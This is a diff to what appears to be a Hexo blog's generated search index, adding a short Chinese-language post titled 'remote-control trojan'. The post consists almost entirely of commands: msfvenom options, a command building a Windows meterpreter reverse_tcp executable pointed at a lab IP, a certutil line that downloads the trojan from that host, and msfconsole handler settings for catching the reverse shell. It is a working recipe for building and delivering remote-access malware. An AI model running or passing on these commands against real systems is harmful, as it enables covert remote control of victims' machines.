@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>远控木马</title>
+      <link href="/2024/02/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/"/>
+      <url>/2024/02/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/</url>
+      
+        <content type="html"><![CDATA[<h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l  列出所有可用的payload,编码器,空指令……</span><br><span class="line">-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span><br><span class="line">-e  指定要使用那种编码器</span><br><span class="line">-i  指定编码的次数,如果使用编码器</span><br><span class="line">-b  指定坏字符,比如空字符截断问题,等等……</span><br><span class="line">-x  使用一个自定义可执行程序模板,并将payload嵌入其中</span><br><span class="line">-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span><br><span class="line">-o  指定创建好的payload的存放位置</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD &lt;Payload name&gt;</span><br><span class="line">set LHOST &lt;LHOST value&gt;</span><br><span class="line">set LPORT &lt;LPORT value&gt;</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.119.132 lport=9999 -f exe -o test.exe</span><br></pre></td></tr></table></figure><h2 id="windows证书工具下载木马"><a href="#windows证书工具下载木马" class="headerlink" title="windows证书工具下载木马"></a>windows证书工具下载木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.119.132:10000/test.exe</span><br></pre></td></tr></table></figure><h2 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.119.132</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SICTF wp</title>
       <link href="/2024/02/17/SICTF-wp/"/>
       <url>/2024/02/17/SICTF-wp/</url>
